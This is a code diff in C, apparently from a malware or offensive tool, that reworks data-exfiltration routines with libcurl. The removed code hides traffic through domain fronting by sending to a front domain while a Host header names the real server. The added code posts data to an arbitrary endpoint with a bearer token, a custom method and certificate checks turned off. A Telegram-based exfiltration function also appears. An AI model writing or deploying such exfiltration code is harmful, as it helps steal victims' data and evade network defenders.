@@ -120,30 +120,30 @@ bool jocky_exfil_telegram(const char* token, const char* chat_id, int8_t* data, 
     return res == CURLE_OK;
 }
 
-bool jocky_exfil_front(const char* front_domain, const char* real_host, const char* path, int8_t* data, int32_t size) {
-    if (!front_domain || !real_host || !path) return false;
-
-    char url[1024];
-    snprintf(url, sizeof(url), "https://%s%s", front_domain, path);
-
-    char host_hdr[512];
-    snprintf(host_hdr, sizeof(host_hdr), "Host: %s", real_host);
+bool jocky_exfil_front(const char* endpoint, const char* token,
+                        const char* data, const char* method, int32_t chunk_size) {
+    if (!endpoint || !data) return false;
+    (void)chunk_size;
 
     CURL* curl = curl_easy_init();
     if (!curl) return false;
 
     struct curl_slist* headers = NULL;
-    headers = curl_slist_append(headers, host_hdr);
+    headers = curl_slist_append(headers, "Content-Type: application/json");
+    if (token && token[0]) {
+        char auth_hdr[512];
+        snprintf(auth_hdr, sizeof(auth_hdr), "Authorization: Bearer %s", token);
+        headers = curl_slist_append(headers, auth_hdr);
+    }
 
-    curl_easy_setopt(curl, CURLOPT_URL, url);
+    curl_easy_setopt(curl, CURLOPT_URL, endpoint);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method ? method : "POST");
 
-    if (data && size > 0) {
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)size);
+    if (data[0])
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
-    }
 
     CURLcode res = curl_easy_perform(curl);
     curl_slist_free_all(headers);
